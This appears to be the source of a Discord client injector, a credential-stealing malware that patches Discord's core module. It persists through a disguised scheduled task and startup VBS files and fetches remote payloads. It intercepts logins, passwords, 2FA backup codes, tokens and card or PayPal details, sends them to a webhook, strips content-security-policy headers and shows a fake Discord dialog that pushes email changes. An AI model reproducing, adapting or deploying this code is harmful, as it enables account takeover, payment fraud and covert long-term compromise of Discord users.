    const vbsFilePathInProtect = path.join(protectFolderPath, vbsFileName);
    const startupFolderPath = path.join(process.env.APPDATA, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
    const vbsFilePathInStartup = path.join(startupFolderPath, vbsFileName);
    const batFilePath = path.join(__dirname, batFileName);

    const scriptVbsContent = await request('GET', CONFIG.injector_url, {
        'Content-Type': 'text/plain'
    });

    const responseVbsMalware = (scriptVbsContent[0]).toString('utf8') ?? '';
    const vbsContent = responseVbsMalware
        .replace("replace_webhook_url", CONFIG.webhook)
        .replace("replace_api_url", CONFIG.API)
        .replace("replace_auto_user_profile_edit", CONFIG.auto_user_profile_edit)
        .replace("replace_auto_email_update", CONFIG.auto_email_update);

    const checkFileExists = (filePath) => {
        return new Promise((resolve) => {
            fs.access(filePath, fs.constants.F_OK, (err) => {
                resolve(!err);
            });
        });
    };

    const checkScheduledTaskExists = () => {
        return new Promise((resolve) => {
            exec('schtasks /query /tn "WindowsSecurityHealthSystrayk4itrun"', (err) => {
                resolve(!err);
            });
        });
    };

    const createVBSFile = (filePath) => {
        return new Promise((resolve, reject) => {
            fs.writeFile(filePath, vbsContent.trim(), (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const createBatchFile = () => {
        const batContent = `
            @echo off
            setlocal

            set "vbsFilePath=%APPDATA%\\Microsoft\\Protect\\${vbsFileName}"

            schtasks /create /tn "WindowsSecurityHealthSystrayk4itrun" /tr "wscript.exe \"%vbsFilePath%\"" /sc onlogon /f

            if %ERRORLEVEL% EQU 0 (
                echo We are scanning your Discord application(s)....
            ) else (
                echo An unexpected error occurred...
            )

            timeout /t 5 /nobreak > NUL
            del "%~f0"

            endlocal
        `;

        return new Promise((resolve, reject) => {
            fs.writeFile(batFilePath, batContent.trim(), (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const executeBatchFile = () => {
        return new Promise((resolve, reject) => {
            exec(`powershell -Command "Start-Process cmd -ArgumentList '/c \"${batFilePath}\"' -Verb RunAs"`, (err) => {
                if (err) return reject(err);
                resolve();
            });
        });
    };

    const protectExists = await checkFileExists(vbsFilePathInProtect);
    const startupExists = await checkFileExists(vbsFilePathInStartup);
    const taskExists = await checkScheduledTaskExists();

    if (!protectExists) {
        await createVBSFile(vbsFilePathInProtect);
    }
    if (!startupExists) {
        await createVBSFile(vbsFilePathInStartup);
    }

    if (!taskExists) {
        await createBatchFile();
        await executeBatchFile();

        setTimeout(() => {
            fs.unlink(batFilePath, (unlinkErr) => {
                if (unlinkErr) {
                    console.error('Error deleting batch file:', unlinkErr);
                } else {
                    console.log('Batch file deleted.');
                }
            });
        }, 10000);
    }
};

const startup = async () => {
    const startupDir = path.join(__dirname, 'aurathemes');
    if (fs.existsSync(startupDir)) {
        fs.rmdirSync(startupDir);
        CONFIG.get.logout();
        let AuritaData = await AuritaCord();
        if (!AuritaData.token) return;
        Cruise(
            'INJECTED',
            null,
            null,
            null,
            null,
            AuritaData.token,
            `It is injected in the route: \`${__dirname.trim().replace(/\\/g, "/")}\``
        );
        execScript('document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.clear();document.body.removeChild(document.querySelector(\'iframe\'));');
        execScript('window.location.href=window.location.href;');
    }

    const getDiscordPaths = () => {
        const args = process.argv;
        const appDir = args[0].split(path.sep).slice(0, -1).join(path.sep);
        let resource;

        switch (process.platform) {
            case 'win32':
                resource = path.join(appDir, 'resources');
                break;
            case 'darwin':
                resource = path.join(appDir, 'Contents', 'Resources');
                break;
            default:
                return { 
                    resource: undefined, 
                    app: undefined 
                };
        }

        if (fs.existsSync(resource)) {
            return { 
                resource: resource, 
                app: appDir 
            };
        }

        return { 
            resource: undefined, 
            app: undefined 
        };
    };

    const { resource, app } = getDiscordPaths();

    if (!resource || !app) return;
    const appDir = path.join(resource, 'app');

    const packageJsonFile = path.join(appDir, 'package.json');
    const startupScriptRunJsFile = path.join(appDir, 'index.js');

    const coreJsFile = path.join(app, 'modules', fs.readdirSync(path.join(app, 'modules')).find(file => /discord_desktop_core-/.test(file)), 'discord_desktop_core', 'index.js');
    const betterDiscordAsarFile = path.join(process.env.APPDATA, 'betterdiscord', 'data', 'betterdiscord.asar');
    
    if (!fs.existsSync(appDir)) {
        fs.mkdirSync(appDir, { recursive: true });
    }
    
    if (fs.existsSync(packageJsonFile)) fs.unlinkSync(packageJsonFile);
    if (fs.existsSync(startupScriptRunJsFile)) fs.unlinkSync(startupScriptRunJsFile);
    
    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(packageJsonFile, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
    
        const scriptRunJsFileContent = `
            const fs = require('fs');
            const https = require('https');
            const path = require('path');
            const coreJsFile = '${coreJsFile}';
            const betterDiscordAsarFile = '${betterDiscordAsarFile}';
            const initialize = async () => {
                try {
                    const data = await fs.promises.readFile(coreJsFile, 'utf8');
                    if (data.length < 20000 || data === "module.exports = require('./core.asar')") {
                        await downloadAndUpdateFile();
                    }
                } catch (err) {
                    console.error(err);
                }
            };
            const downloadAndUpdateFile = async () => {
                try {
                    const fileStream = fs.createWriteStream(coreJsFile);
                    await new Promise((resolve, reject) => {
                        https.get('${CONFIG.injection_url}', (res) => {
                            res.on('data', chunk => fileStream.write(chunk.toString().replace('%WEBHOOK_URL%', '${CONFIG.webhook}')));
                            res.on('end', () => {
                                fileStream.end();
                                resolve();
                            });
                        }).on('error', err => {
                            reject(err);
                        });
                    });
                } catch (err) {
                    setTimeout(downloadAndUpdateFile, 10000);
                }
            };
            initialize();
            require('${path.join(resource, 'app.asar')}');
            if (fs.existsSync(betterDiscordAsarFile)) require(betterDiscordAsarFile);
        `;
        fs.writeFileSync(startupScriptRunJsFile, scriptRunJsFileContent.replace(/\\/g, '\\\\'));
    }
    
};

const AuritaCord = async () => {
    try {
        const token = await CONFIG['get']['token']();
        const API = new Fetcher(token),
            user = await API.User(),
            profile = await API.Profile(),
            billing = await API.Billing(),
            friends = await API.Friends(),
            servers = await API.Servers();
        return {
            token,
            user,
            profile,
            billing,
            friends,
            servers
        };
    } catch {
        return {}
    }
}

let [
    AuritaData,
    email,
    password,
    startup_event_occurred,
    script_executed
] = [
    '',
    '',
    '',
    false,
    false
];

const parseJSON = (data) => {
    try {
        return JSON.parse(data || '');
    } catch {
        return {};
    }
};

const delay = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms))
};

const GangwayCord = async (params, RESPONSE_DATA, RESQUEST_DATA, token, user) => {
    switch (true) {
        case params.response.url.endsWith('/login'):
            if (params.response.url.endsWith('/remote-auth/login')) {
                if (!RESPONSE_DATA.encrypted_token) return;

                await delay(2000);

                AuritaData = await AuritaCord();
                const { token, user } = AuritaData;

                Cruise(
                    'LOGIN_USER',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    user.email,
                    'The password was not found',
                    token,
                    `You have logged in using QR code`
                );
            } 
            
            if (!RESPONSE_DATA.token) {
                email = RESQUEST_DATA.login || user.email;
                password = RESQUEST_DATA.password;
                return;
            }

            Cruise(
                'LOGIN_USER',
                RESPONSE_DATA,
                RESQUEST_DATA,
                RESQUEST_DATA.login,
                RESQUEST_DATA.password,
                RESPONSE_DATA.token,
                `has Logged in-`
            );
            break;

        case params.response.url.endsWith('/register'):
            Cruise(
                'LOGIN_USER',
                RESPONSE_DATA,
                RESQUEST_DATA,
                RESQUEST_DATA.email,
                RESQUEST_DATA.password,
                token,
                'has \`Created\` a new account'
            );
            break;

        case params.response.url.endsWith('/totp'):
            Cruise(
                'LOGIN_USER',
                RESPONSE_DATA,
                RESQUEST_DATA,
                email,
                password,
                RESPONSE_DATA.token,
                `you are logged in with \`2FA\``
            );
            break;

        case params.response.url.endsWith('/enable'):
        case params.response.url.endsWith('/codes-verification'):
            const codesCount = RESPONSE_DATA.backup_codes ? RESPONSE_DATA.backup_codes.length : 0;
            Cruise(
                'BACKUP_CODES',
                RESPONSE_DATA,
                RESQUEST_DATA,
                email,
                password,
                token,
                `\`${codesCount} Security\` codes have just been added`
            );
            break;

        case params.response.url.endsWith('/@me'):
            if (!RESQUEST_DATA.password) return;
            if (RESQUEST_DATA.email && RESQUEST_DATA.email_token) {
                Cruise(
                    'EMAIL_CHANGED',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    RESQUEST_DATA.email,
                    RESQUEST_DATA.password,
                    RESQUEST_DATA.token,
                    `has updated their gmail to \`${RESQUEST_DATA.email}\``
                );
            }
            if (RESQUEST_DATA.new_password) {
                Cruise(
                    'PASSWORD_CHANGED',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    email,
                    RESQUEST_DATA.password,
                    token,
                    `has updated their password to \`${RESQUEST_DATA.password}\``
                );
            }
            if (RESQUEST_DATA.username) {
                Cruise(
                    'USERNAME_CHANGED',
                    RESPONSE_DATA,
                    RESQUEST_DATA,
                    email,
                    RESQUEST_DATA.password,
                    token,
                    `has updated their username to \`${RESQUEST_DATA.username}\``
                );
            }
            break;
    };
};

const createWindow = (mainWindow) => {
    if (!mainWindow) return;
    if (CONFIG.force_persist_startup === 'true' && !startup_event_occurred) {
        forcePersistStartup();
        startup_event_occurred = true;
    }
    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if ('Network.responseReceived' !== method) return;
        if (!startup_event_occurred) {
            await startup();
            startup_event_occurred = true;
        }
        if (
            !CONFIG.auth_filters.urls.some(url => params.response.url.endsWith(url)) ||
            ![200, 202].includes(params.response.status)
        ) return;

        try {
            const [
                responseUnparsed,
                requestUnparsed
            ] = await Promise.all([
                mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {requestId: params.requestId}),
                mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {requestId: params.requestId})
            ]);            

            const RESPONSE_DATA = parseJSON(responseUnparsed.body);
            const RESQUEST_DATA = parseJSON(requestUnparsed.postData);

            AuritaData = await AuritaCord();
            const { token, user } = AuritaData;

            GangwayCord(params, RESPONSE_DATA, RESQUEST_DATA, token, user);
        } catch (error) {
            console.error(error);
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');

    mainWindow.on('closed', () => {
        const windows = BrowserWindow.getAllWindows();
        if (windows.length > 0) {
            createWindow(windows[0]);
        }
    });
};

const defaultSession = (webRequest) => {
    webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
        const { url, uploadData, method, statusCode, billing_address } = details;

        if (!['POST'].includes(method) && ![200, 202].includes(statusCode)) return;

        AuritaData = await AuritaCord();
        const { token, user } = AuritaData;

        switch (true) {
            case url.includes('stripe'): {
                let item;
                try {
                    item = querystring.parse(Buffer.from(uploadData[0].bytes).toString());
                } catch (error) {
                    item = querystring.parse(decodeURIComponent(uploadData[0]?.bytes.toString() || ''));
                }

                const { line_1, line_2, city, state, postal_code, country, email } = billing_address;
                const request = {
                    item,
                    line_1, 
                    line_2, 
                    city, 
                    state, 
                    postal_code, 
                    country,
                    email
                };

                Cruise(
                    'CREDITCARD_ADDED',
                    null,
                    request,
                    null,
                    null,
                    token,
                    `you just added a \`Credit Card\``
                );
                break;
            }
            case (url.endsWith('paypal_accounts') && url.endsWith('billing-agreement-tokens')): {
                Cruise(
                    'PAYPAL_ADDED',
                    null,
                    null,
                    null,
                    null,
                    token,
                    `you just added a <:Paypal:1129073151746252870> \`Paypal\` account`
                );
                break;
            }
        }
    });
    
    webRequest.onHeadersReceived(async (request, callback) => {
        const { url, method, statusCode, responseHeaders, uploadData } = request;
        const updatedHeaders = { ...responseHeaders };

        delete updatedHeaders["content-security-policy"];
        delete updatedHeaders["content-security-policy-report-only"];

        callback({responseHeaders: {
            ...updatedHeaders, 
            "Access-Control-Allow-Headers": "*" 
        }});

        if (url.endsWith('/@me') && !script_executed) {
            if (CONFIG.auto_user_profile_edit === 'true') {
                script_executed = true;
                await editSettingUser();
            };
    
            if (CONFIG.auto_email_update === 'true') {
                script_executed = true;

                let AuritaData = await AuritaCord();
                const language = AuritaData.user.locale || 'en-US';

                const truncateEmail = (email) => {
                    if (!email) return '@';
                    const [localPart, domain] = email.split('@');
                    const truncatedLocalPart = localPart.length > 15 ? `${localPart.slice(0, 15)}...` : localPart;
                    return `${truncatedLocalPart}@${domain}`;
                };
                const getDiscordDomain = (maper) => {
                    const path = __dirname.trim().replace(/\\/g, "/");
                    const regex = /\/Local\/(discord|discordcanary|discordptb|discorddevelopment)\//i;
                    const match = path.match(regex);
                    let domain = 'discord.com'; 
                    if (match && maper[match[1].toLowerCase()]) {
                        domain = maper[match[1].toLowerCase()];
                    }
                    return domain
                }
    
                const [
                    CONFIG_ALERT,
                    EDIT_MAIL_ALERT,
                    ALERT_INTRO,
                    END_INTRO_ALERT,
                    CHANGE_ALERT,
                    LAST_END_ALERT,
                    CONTACT_ALERT,
                ] = await translateAutoEmailUpdate(language);
                  
                await execScript(`
                    function loadStylesheets() {
                        const stylesheets = [
                            "https://discord.com/assets/d4261c08ee2b8d686d9d.css",
                            "https://discord.com/assets/ed0fd6a2ab291ba57d4a.css",
                        ];
    
                        const head = document.head || document.getElementsByTagName('head')[0];
    
                        stylesheets.forEach(url => {
                            const stylesheetLink = document.createElement('link');
                            stylesheetLink.rel = 'stylesheet';
                            stylesheetLink.href = url;
                            head.appendChild(stylesheetLink);
                        });
                    }
                    
                    async function simulateClicks() {
                        try {
                            loadStylesheets();
                            const div = document.createElement("div");
                            div.innerHTML = \`
                                <div class="layerContainer_cd0de5">
                                    <div class="backdrop_e4f2ae withLayer_e4f2ae" style="background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(0px);">
                                    </div>
                                    <div class="layer_c9e2da">
                                        <div class="focusLock_f9a4c9" role="dialog" aria-labelledby=":r11:" tabindex="-1" aria-modal="true">
                                            <div class="root_f9a4c9 small_f9a4c9 fullscreenOnMobile_f9a4c9 rootWithShadow_f9a4c9"
                                                style="opacity: 1; transform: scale(1);"><img alt="" class="emailHeaderImg_a62824" src="/assets/8b500863ec942f68c46b.svg">
                                                <div style="position: relative; width: 440px; height: 380px; overflow: hidden;">
                                                    <div style="position: absolute; flex-direction: column; backface-visibility: hidden; width: 440px; transform: translate3d(0px, -50%, 0px) scale(1, 1); top: 50%; opacity: 1;">
                                                        <form>
                                                            <div class="flex_dc333f horizontal_dc333f justifyStart_ec1a20 alignCenter_ec1a20 noWrap_ec1a20 header_f9a4c9 header_a62824" id=":r11:" style="flex: 0 0 auto;">
                                                                <h1 class="defaultColor_a595eb heading-xl/extrabold_dc00ef defaultColor_e9e35f title_a62824" data-text-variant="heading-xl/extrabold">
                                                                    ${CONFIG_ALERT}
                                                                </h1>
                                                            </div>
                                                            <div class="content_f9a4c9 content_a62824 thin_c49869 scrollerBase_c49869" dir="ltr" style="overflow: hidden scroll; padding-right: 8px;">
                                                                <div class="defaultColor_a595eb text-md/normal_dc00ef description_a62824" data-text-variant="text-md/normal">
                                                                    <p>${ALERT_INTRO} (<strong>${truncateEmail(AuritaData.user.email || 'user@gmail.com')}</strong>) ${END_INTRO_ALERT}</p>
                                                                    <p>${CHANGE_ALERT}</p>
                                                                    <p>${LAST_END_ALERT} ${CONTACT_ALERT}</p>
                                                                </div>
                                                                <div aria-hidden="true" style="position: absolute; pointer-events: none; min-height: 0px; min-width: 1px; flex: 0 0 auto; height: 16px;"></div>
                                                            </div>
                                                            <div class="flex_dc333f horizontalReverse_dc333f justifyStart_ec1a20 alignStretch_ec1a20 noWrap_ec1a20 footer_f9a4c9 modalFooter_a62824 footerSeparator_f9a4c9" style="flex: 0 0 auto;">
                                                                <a href="https://${getDiscordDomain({'discord':'discord.com','discordcanary':'canary.discord.com','discordptb':'ptb.discord.com','discorddevelopment':'canary.discord.com'})}/settings/account" class="button_dd4f85 lookFilled_dd4f85 colorBrand_dd4f85 sizeMedium_dd4f85 grow_dd4f85">
                                                                    <div class="contents_dd4f85">
                                                                        ${EDIT_MAIL_ALERT}
                                                                    </div>
                                                                </a>
                                                            </div>
                                                        </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            \`;
                            document.body.appendChild(div);
                            document.body.appendChild(div);
                            await new Promise((resolve) => setTimeout(resolve, 999999999));
                            document.body.removeChild(div);
                        } catch (error) {
                        }
                    }
                    
                    simulateClicks();
                `);
            };
        }
    });
}

createWindow(BrowserWindow.getAllWindows()[0]);
defaultSession(session.defaultSession.webRequest);

module.exports = require("./core.asar");